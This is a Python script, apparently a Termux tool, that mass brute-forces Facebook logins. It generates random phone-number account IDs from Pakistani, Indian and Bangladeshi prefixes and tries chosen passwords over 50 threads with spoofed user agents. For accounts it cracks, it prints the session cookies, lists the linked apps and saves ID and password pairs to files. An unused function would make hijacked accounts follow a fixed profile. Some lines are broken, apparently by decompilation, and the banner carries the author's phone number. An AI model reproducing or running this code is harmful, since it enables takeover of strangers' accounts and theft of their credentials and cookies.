
import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')

class jalan:
    
    def __init__(self, z):
        pass




def Nahid():
    os.system('clear')
    print(logo)
    print(' [1] start')
    print(' [2] EXIT')
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        i()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')




import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = ("""
  ╔═══════════════════════════════════╗
 \033[1;97m ║ \033[35;1m╔═══════════╗\033[35;1m ╔════╗ ╔═════════╗ \033[1;97║ \033[1;97m║
 \033[1;97m ║ \033[35;1m║\033[31;1m ███   ██ \033[35;1m ║\033[35;1m ║ \033[32;1m██\033[35;1m ║\033[35;1m ║\033[33;1m ██      \033[31;1\033[35;1m║ \033[1;97m ║
 \033[1;97m ║ \033[35;1m║\033[31;1m ████  ██ \033[35;1m ║ \033[35;1m║ \033[32;1m██\033[35;1m ║ \033[35;1m║\033[33;1m ██      \033[31;1\033[35;1m║ \033[1;97m ║  
 \033[1;97m ║ \033[35;1m║\033[31;1m ██ ██ ██ \033[35;1m ║ \033[35;1m║ \033[32;1m██\033[35;1m ║ \033[35;1m║\033[33;1m ██      \033[31;1\033[35;1m║ \033[1;97m ║
 \033[1;97m ║ \033[35;1m║\033[31;1m ██  ████ \033[35;1m ║ \033[35;1m║ \033[32;1m██\033[35;1m ║ \033[35;1m║\033[33;1m ███████ \033[31;1\033[35;1m║  \033[1;97m║  
 \033[1;97m ║ \033[35;1m╚═══════════╝ \033[35;1m╚════╝ ╚═════════╝\033[1;97m  ║
 \033[1;97m ║ \033[35;1m╔══════════╗ ╔══════════╗ ╔═════╗ \033[1;97m║
 \033[1;97m ║ \033[35;1m║ \033[32;1m ██████\033[35;1m  ║\033[35;1m ║\033[31;1m ██    ██ \033[35;1m║\033[35;1m ║\033[35;1m🔥𝑵🔥\033[35;1m║ \033[1;97m║
 \033[1;97m ║ \033[35;1m║\033[32;1m ██    ██\033[35;1m ║\033[35;1m ║\033[31;1m  ██  ██  \033[35;1m║\033[35;1m ║\033[35;1m🔥𝐼🔥\033[35;1m║ \033[1;97m║
 \033[1;97m ║ \033[35;1m║\033[32;1m ██    ██\033[35;1m ║\033[35;1m ║ \033[31;1m  ████ \033[35;1m  ║\033[35;1m ║\033[35;1m🔥𝐿🔥\033[35;1m║ \033[1;97m║
 \033[1;97m ║ \033[35;1m║\033[32;1m ██    ██\033[35;1m ║\033[35;1m ║ \033[31;1m   ██  \033[35;1m  ║\033[35;1m ║\033[35;1m🔥𝒪🔥\033[35;1m║ \033[1;97m║
 \033[1;97m ║ \033[35;1m║\033[32;1m  ██████\033[35;1m  ║\033[35;1m ║   \033[31;1m ██ \033[35;1m   ║\033[35;1m ║\033[35;1m🔥𝒀🔥\033[35;1m║\033[1;97m ║
 \033[1;97m ║ \033[35;1m╚══════════╝ ╚══════════╝ ╚═════╝ \033[1;97m║
  \033[1;97m╚═══════════════════════════════════╝
\033[38;5;46m╔═════════════╗          ╔═══════════════╗ 
\033[38;5;46m║[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   ║ ࿇⃝🌹⃢J 🌹⃝࿇ \033[38;5;46m║\033[38;5;46mJAHID          ║
\033[38;5;46m║[🔵]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║ ࿇⃝🌹⃢A 🌹⃝࿇ \033[38;5;46m║\033[38;5;46mJAHID-HASAN║
\033[38;5;46m║[🔵]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ║ ࿇⃝🌹⃢H 🌹⃝࿇ \033[38;5;46m║\033[38;5;46m01865508461    ║
\033[38;5;46m║[🔵]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁   ║ ࿇⃝🌹⃢I 🌹⃝࿇ \033[38;5;46m║\033[38;5;46mJAHID    ║
\033[38;5;46m║[🔵]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║ ࿇⃝🌹⃢D 🌹⃝࿇ \033[38;5;46m║\033[38;5;46m01865508461    ║
\033[38;5;46m║[🔵]\033[38;5;46m𝐖𝐎𝐑𝐊𝐀𝐒   ║ ࿇⃝🌹⃢4 🌹⃝࿇ \033[38;5;46m║\033[38;5;46m𝐃𝐀𝐓𝐀 & 𝐖𝐈𝐅𝐈    ║
\033[38;5;46m║[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     ║ ࿇⃝🌹⃢4 🌹⃝࿇ \033[38;5;46m║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇     ║
\033[38;5;46m╚═════════════╝ ࿇⃝🌹⃢4🌹⃝࿇ \033[38;5;46m╚═══════════════╝\033[1;37""")
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    
    
    print("\033[1;37m\t  USE OUR COUNTRY CODE  ")
    print('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
    print('\033[1;32m============================================')
    print('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
    print('\033[1;32m============================================')
    print('\033[1;36m     \t     BD CODES\n     \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97m')
    print('\033[1;32m============================================\n')
    code = input(' PUT CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 20000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[*] Enter Password Limit : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[*] Enter Password : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;36m TOTAL IDS: '+tl)
        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 4 MIN ')
        print('\033[1;32m============================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m============================================')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m============================================')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;JAHID";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('    \33[1;30m(NILOY-OK 💚)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/NILOY-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('   \033[1;32m(JAHID-OK 💚)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/JAHID-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r %s[NILOY] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
Nahid()
 
